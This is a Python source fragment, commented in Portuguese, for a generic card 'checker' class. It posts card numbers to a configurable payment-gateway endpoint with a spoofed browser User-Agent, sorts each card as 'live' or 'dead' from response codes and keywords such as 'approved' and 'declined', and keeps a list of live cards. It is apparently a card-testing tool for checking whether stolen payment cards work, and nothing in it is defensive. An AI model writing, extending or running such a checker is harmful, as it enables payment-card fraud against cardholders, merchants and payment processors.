class GenericChecker(CheckerBase):
    def __init__(self, config: Dict):
        super().__init__(config)
        self.session = requests.Session()
        self.base_config = config
        
    def test_card(self, card_data: Dict, gateway_config: Dict) -> Dict:
        """Checker genérico para qualquer gateway"""
        try:
            # Prepara payload usando template
            payload_template = gateway_config.get('payload_template', {})
            payload = self.create_payload(card_data, payload_template)
            
            # Prepara headers
            headers = gateway_config.get('headers', {})
            headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            })
            
            # Faz requisição
            endpoint = gateway_config.get('endpoint', '')
            method = gateway_config.get('method', 'POST').upper()
            
            if method == 'POST':
                response = self.session.post(
                    endpoint,
                    json=payload,
                    headers=headers,
                    timeout=15
                )
            elif method == 'GET':
                response = self.session.get(
                    endpoint,
                    params=payload,
                    headers=headers,
                    timeout=15
                )
            else:
                return {
                    'card': card_data['card_number'],
                    'status': 'error',
                    'error': f'Método {method} não suportado'
                }
            
            # Analisa resposta
            result = self.analyze_response(
                response, 
                card_data, 
                gateway_config
            )
            
            return result
            
        except Exception as e:
            return {
                'card': card_data.get('card_number', ''),
                'status': 'error',
                'error': str(e)
            }
    
    def analyze_response(self, response, card_data: Dict, config: Dict) -> Dict:
        """Analisa resposta baseado em regras de validação"""
        result = {
            'card': card_data['card_number'],
            'status': 'unknown',
            'response_code': response.status_code,
            'gateway': config.get('gateway_name', 'generic')
        }
        
        validation = config.get('validation', {})
        success_codes = validation.get('success_codes', [200])
        
        # Verifica código de status
        if response.status_code in success_codes:
            result['status'] = 'live'
            self.live_cards.append(card_data)
        
        # Verifica padrões na resposta
        response_text = response.text.lower()
        
        # Padrões de sucesso
        success_patterns = validation.get('live_indicators', [
            'success', 'approved', 'valid', 'created', 'active'
        ])
        
        for pattern in success_patterns:
            if pattern in response_text:
                result['status'] = 'live'
                self.live_cards.append(card_data)
                break
        
        # Padrões de erro
        error_patterns = validation.get('error_patterns', [
            'declined', 'invalid', 'error', 'failed', 'rejected'
        ])
        
        if result['status'] == 'unknown':
            for pattern in error_patterns:
                if pattern in response_text:
                    result['status'] = 'dead'
                    break
        
        return result